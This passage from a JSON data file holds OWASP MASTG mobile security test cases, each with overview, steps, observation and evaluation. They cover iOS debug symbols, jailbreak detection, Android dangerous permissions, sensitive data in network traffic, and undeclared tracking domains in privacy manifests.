target=\"_blank\">\"Build Settings\" &gt; \"Build Options &gt; \"Debug Information Format\" ↗</a>, this setting determines the format of the debug information. Options include:<ul><li><strong>DWARF</strong>: Embeds debugging information directly into the binary.</li><li><strong>DWARF with dSYM File</strong>: Generates a separate dSYM file containing debugging information.</li></ul></li></ul><p>Note that in compiled iOS applications, symbol names may undergo <strong>name mangling</strong> and additional <strong>obfuscation techniques</strong> to further obscure them, making reverse engineering more challenging. While demangling tools can decode standard mangled names (see <em><a href=\"https://mas.owasp.org/MASTG-TECH-0114\" rel=\"noopener noreferrer\" target=\"_blank\"> Demangling Symbols</a></em>), they may not effectively reverse custom obfuscation methods.</p><h2></h2><h2>Steps</h2><ol><li>Apply <em><a href=\"https://mas.owasp.org/MASTG-TECH-0058\" rel=\"noopener noreferrer\" target=\"_blank\"> Exploring the App Package</a></em> to extract the contents from the IPA file.</li><li>For all executables and libraries of the app, use <em><a href=\"https://mas.owasp.org/MASTG-TECH-0113\" rel=\"noopener noreferrer\" target=\"_blank\"> Obtaining Debugging Symbols</a></em> to verify there are no debugging symbols present.</li></ol><h2></h2><h2>Observation</h2><p>The output should contain a list of symbols for each executable and library.</p><h2></h2><h2>Evaluation</h2><p>The test fails if there are symbols marked as debug symbols in the output.</p><p>Before releasing an iOS app, verify that the \"Build Settings\" &gt; \"Apple Clang - Code Generation\" &gt; \"Generate Debug Symbols\" setting is set to \"No\". Additionally, utilize tools like the ones used in <em><a href=\"https://mas.owasp.org/MASTG-TECH-0113\" rel=\"noopener noreferrer\" target=\"_blank\"> Obtaining Debugging Symbols</a></em> to inspect the final binaries for any residual debugging symbols.</p><p>For release builds, it's advisable to set \"Build Settings\" &gt; \"Build Options &gt; \"Debug Information Format\" to \"DWARF with dSYM File\" and ensure that the dSYM files are securely stored and not distributed with the app. This approach facilitates post-release crash analysis without exposing debugging symbols in the distributed binary.</p>",
        "code": "MASTG-TEST-0219",
        "sort_order": 132
    },
    {
        "tags":
        [
            "MASTG-TEST-0241: Runtime Use of Jailbreak Detection Techniques"
        ],
        "testcase": "Runtime Use of Jailbreak Detection Techniques",
        "details": "<h2>Overview</h2><p>The test verifies that a mobile application can identify if the iOS device it is running on is jailbroken. It does so by dynamically analyzing the app binary for <a href=\"https://mas.owasp.org/MASTG/0x06j-Testing-Resiliency-Against-Reverse-Engineering/#common-jailbreak-detection-checks\" rel=\"noopener noreferrer\" target=\"_blank\">common jailbreak detection checks</a> and trying to bypass them. For example, it may detect a check for the presence of certain files or directories that are indicative of a jailbroken device.</p><p>The limitations of using jailbreak detection bypass tools should be considered. It is possible that the app uses more sophisticated jailbreak detection techniques that are not detected by the tool used. In such cases, careful manual reverse engineering and deobfuscation are required to identify the jailbreak detection checks. Also, additional dynamic analysis work may be required to bypass the jailbreak detection checks.</p><h2></h2><h2>Steps</h2><ol><li>Run a dynamic analysis tool such as <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0038\" rel=\"noopener noreferrer\" target=\"_blank\"> objection</a></em> on the app and execute its <a href=\"https://mas.owasp.org/MASTG/0x06j-Testing-Resiliency-Against-Reverse-Engineering/#automated-jailbreak-detection-bypass\" rel=\"noopener noreferrer\" target=\"_blank\">automated jailbreak detection bypass commands</a></li></ol><h2></h2><h2>Observation</h2><p>The output should include any instances of common jailbreak detection checks in the app binary and the results of the automated jailbreak detection bypass commands.</p><h2></h2><h2>Evaluation</h2><p>The test passes if the automated jailbreak detection bypass command indicates that the application is testing for known jailbreak artefacts.</p><p>The test fails if jailbreak detection is not implemented. However, note that this test is not exhaustive and may not detect all jailbreak detection checks as it relies on predefined bypass code that may not cover all possible jailbreak detection checks or may not be up-to-date. The checks may also be more sophisticated than what the tool can detect so manual reverse engineering and deobfuscation may be required to identify them.</p>",
        "code": "MASTG-TEST-0241",
        "sort_order": 135
    },
    {
        "tags":
        [
            "MASTG-TEST-0254: Dangerous App Permissions"
        ],
        "testcase": "Dangerous App Permissions",
        "details": "<h2>Overview</h2><p>In Android apps, permissions are acquired through different methods to access information and system functionalities, including the camera, location, or storage. The necessary permissions are specified in the AndroidManifest.xml file with &lt;uses-permission&gt; tags.</p><h2></h2><h2>Steps</h2><p>There are multiple tools that can help in finding permissions in use by an app. Refer <em><a href=\"https://mas.owasp.org/MASTG-TECH-0118\" rel=\"noopener noreferrer\" target=\"_blank\"> Obtaining Compiler-Provided Security Features</a></em> to and use any of the mentioned tools.</p><ol><li>Extract the AndroidManifest.xml file from the APK (see <em><a href=\"https://mas.owasp.org/MASTG-TECH-0117\" rel=\"noopener noreferrer\" target=\"_blank\"> Obtaining Information from the AndroidManifest</a></em>).</li><li>Obtain the list of declared permissions (see <em><a href=\"https://mas.owasp.org/MASTG-TECH-0126\" rel=\"noopener noreferrer\" target=\"_blank\"> Obtaining App Permissions</a></em>).</li></ol><h2></h2><h2>Observation</h2><p>The output shows the list of permissions declared by the app.</p><h2></h2><h2>Evaluation</h2><p>The test fails if there are any dangerous permissions in the app.</p><p>Compare the list of declared permissions with the list of <a href=\"https://android.googlesource.com/platform/frameworks/base/%2B/master/core/res/AndroidManifest.xml\" rel=\"noopener noreferrer\" target=\"_blank\">dangerous permissions ↗</a> defined by Android. You can find more details in the <a href=\"https://developer.android.com/reference/android/Manifest.permission\" rel=\"noopener noreferrer\" target=\"_blank\">Android documentation ↗</a>.</p><p><strong>Context Consideration</strong>:</p><p>Context is essential when evaluating permissions. For example, an app that uses the camera to scan QR codes should have the CAMERA permission. However, if the app does not have a camera feature, the permission is unnecessary and should be removed.</p><p>Also, consider if there are any privacy-preserving alternatives to the permissions used by the app. For example, instead of using the CAMERA permission, the app could <a href=\"https://developer.android.com/privacy-and-security/minimize-permission-requests#take-photo\" rel=\"noopener noreferrer\" target=\"_blank\">use the device's built-in camera app ↗</a> to capture photos or videos by invoking the ACTION_IMAGE_CAPTURE or ACTION_VIDEO_CAPTURE intent actions. This approach allows the app to access the camera functionality without directly requesting the CAMERA permission, thereby enhancing user privacy.</p>",
        "code": "MASTG-TEST-0254",
        "sort_order": 140
    },
    {
        "tags":
        [
            "MASTG-TEST-0240: Jailbreak Detection in Code"
        ],
        "testcase": "Jailbreak Detection in Code",
        "details": "<h2>Overview</h2><p>The test verifies that a mobile app can detect if the iOS device it is running on is jailbroken. It does so by statically analyzing the app binary for <a href=\"https://mas.owasp.org/MASTG/0x06j-Testing-Resiliency-Against-Reverse-Engineering/#common-jailbreak-detection-checks\" rel=\"noopener noreferrer\" target=\"_blank\">common jailbreak detection checks</a>. For example, the app may check for the presence of a third-party app store (e.g. Sileo, Zebra, ...), or for the presence of certain files or directories that are indicative of a jailbroken device.</p><p>The limitations of static analysis should be considered. It is possible that the app uses more sophisticated jailbreak detection techniques that are not detected by the used tool. In such cases, careful manual reverse engineering and deobfuscation are required to identify the jailbreak detection checks.</p><h2></h2><h2>Steps</h2><ol><li>Run a static analysis tool such as <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0073\" rel=\"noopener noreferrer\" target=\"_blank\"> radare2 for iOS</a></em> on the app binary looking for common jailbreak detection checks.</li></ol><h2></h2><h2>Observation</h2><p>The output should include any instances of common jailbreak detection checks in the app binary.</p><h2></h2><h2>Evaluation</h2><p>The test passes if jailbreak detection is implemented.</p><p>The test fails if jailbreak detection is not implemented. However, note that this test is not exhaustive and may not detect all jailbreak detection checks. Manual reverse engineering and deobfuscation may be required to identify more sophisticated jailbreak detection checks.</p>",
        "code": "MASTG-TEST-0240",
        "sort_order": 134
    },
    {
        "tags":
        [
            "MASTG-TEST-0206: Sensitive Data in Network Traffic Capture"
        ],
        "testcase": "Sensitive Data in Network Traffic Capture",
        "details": "<h2>Overview</h2><p>Attackers may capture network traffic from Android devices using an intercepting proxy, such as <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0079\" rel=\"noopener noreferrer\" target=\"_blank\"> ZAP</a></em>, <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0077\" rel=\"noopener noreferrer\" target=\"_blank\"> Burp Suite</a></em>, or <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0097\" rel=\"noopener noreferrer\" target=\"_blank\"> mitmproxy</a></em>, to analyze the data being transmitted by the app. This works even if the app uses HTTPS, as the attacker can install a custom root certificate on the Android device to decrypt the traffic. Inspecting traffic that is not encrypted with HTTPS is even easier and can be done without installing a custom root certificate for example by using <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0081\" rel=\"noopener noreferrer\" target=\"_blank\"> Wireshark</a></em>.</p><p>The goal of this test is to verify that sensitive data is not being sent over the network, even if the traffic is encrypted. This test is especially important for apps that handle sensitive data, such as financial or health data, and should be performed in conjunction with a review of the app's privacy policy and the App Store Privacy declarations.</p><h2></h2><h2>Steps</h2><ol><li>Start the device.</li><li>Start logging sensitive data from network traffic (<em><a href=\"https://mas.owasp.org/MASTG-TECH-0100\" rel=\"noopener noreferrer\" target=\"_blank\"> Logging Sensitive Data from Network Traffic</a></em>). For example using <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0097\" rel=\"noopener noreferrer\" target=\"_blank\"> mitmproxy</a></em>.</li><li>Launch and use the app going through the various workflows while inputting sensitive data wherever you can. Especially, places where you know that will trigger network traffic.</li></ol><h2></h2><h2>Observation</h2><p>The output should contain a network traffic sensitive data log that includes the decrypted HTTPS traffic.</p><h2></h2><h2>Evaluation</h2><p>The test case fails if you can find the sensitive data you entered in the app that is not stated in the App Store Privacy declarations.</p><p>Note that this test does not provide any code locations where the sensitive data is being sent over the network. In order to identify the code locations, you can use static analysis tools like <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0110\" rel=\"noopener noreferrer\" target=\"_blank\"> semgrep</a></em> or dynamic analysis tools like <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0031\" rel=\"noopener noreferrer\" target=\"_blank\"> Frida</a></em>.</p>",
        "code": "MASTG-TEST-0206",
        "sort_order": 139
    },
    {
        "tags":
        [
            "MASTG-TEST-0281: Undeclared Known Tracking Domains"
        ],
        "testcase": "Undeclared Known Tracking Domains",
        "details": "<h2>Overview</h2><p>This test identifies whether the app properly declares all known tracking domains it may communicate with in the <a href=\"https://developer.apple.com/documentation/bundleresources/app-privacy-configuration/nsprivacytrackingdomains\" rel=\"noopener noreferrer\" target=\"_blank\">NSPrivacyTrackingDomains ↗</a> section of its <a href=\"https://developer.apple.com/documentation/bundleresources/privacy_manifest_files\" rel=\"noopener noreferrer\" target=\"_blank\">Privacy Manifest ↗</a> files.</p><p>To perform this test, use one or more curated lists of known trackers. These lists include domains and identifiers associated with advertising networks, analytics providers, and user profiling services. They are commonly used in privacy-focused tools and browsers to detect and block tracking behavior.</p><p>Some example lists:</p><ul><li><strong><a href=\"https://github.com/duckduckgo/tracker-blocklists/blob/main/web/v5/ios-tds.json\" rel=\"noopener noreferrer\" target=\"_blank\">DuckDuckGo iOS Trackers ↗</a></strong>: Includes domains, matching rules, descriptions, and categories such as \"Action Pixels,\" \"Ad Fraud,\" \"Ad Motivated Tracking,\" and \"Advertising.\"</li><li><strong><a href=\"https://reports.exodus-privacy.eu.org/en/trackers/\" rel=\"noopener noreferrer\" target=\"_blank\">Exodus Privacy Trackers ↗</a></strong>: Includes tracker names, categories (e.g., \"Advertisement,\" \"Analytics,\" \"Profiling\"), descriptions, and detection metadata such as network and code signatures.</li></ul><p>These references can be used to match hardcoded or dynamically accessed domains within your app and verify whether appropriate declarations exist in the Privacy Manifest.</p><h2></h2><h2>Steps</h2><ol><li>Extract the app's privacy manifest files, including those from third-party SDKs or frameworks using <em><a href=\"https://mas.owasp.org/MASTG-TECH-0136\" rel=\"noopener noreferrer\" target=\"_blank\"> Retrieving PrivacyInfo.xcprivacy Files</a></em>.</li><li>Obtain the list of declared tracking domains from the privacy manifest files using <em><a href=\"https://mas.owasp.org/MASTG-TECH-0137\" rel=\"noopener noreferrer\" target=\"_blank\"> Analyzing PrivacyInfo.xcprivacy Files</a></em>.</li><li>Run a static analysis scan using <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0073\" rel=\"noopener noreferrer\" target=\"_blank\"> radare2 for iOS</a></em>:<ul><li>Search for hardcoded references to known tracking domains.</li><li>Identify code references to well-known tracking libraries.</li></ul></li><li>Perform network analysis with <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0097\" rel=\"noopener noreferrer\" target=\"_blank\"> mitmproxy</a></em>:<ul><li>Intercept and log all outbound network traffic.</li><li>Extract all domain names contacted during runtime.</li></ul></li></ol><h2></h2><h2>Observation</h2><p>The output should contain:</p><ul><li>All extracted privacy manifests from the app.</li><li>A list of declared tracking domains from the NSPrivacyTrackingDomains key in the manifests (preferably with associated components).</li><li>A list of all domains contacted during dynamic testing.</li><li>A list of code matches for known tracking domains or tracking libraries from static analysis.</li></ul><h2></h2><h2>Evaluation</h2><p>The test fails if any of the following is missing in the privacy manifest files' NSPrivacyTrackingDomains key for the app or any of its components (Frameworks, Plugins, etc.):</p><ul><li>Tracking domains contacted by the app at runtime.</li><li>Tracking domains found in the code.</li><li>Domains corresponding to tracking SDKs found in the code.</li></ul>",
        "code": "MASTG-TEST-0281",
        "sort_order": 141
    }
]
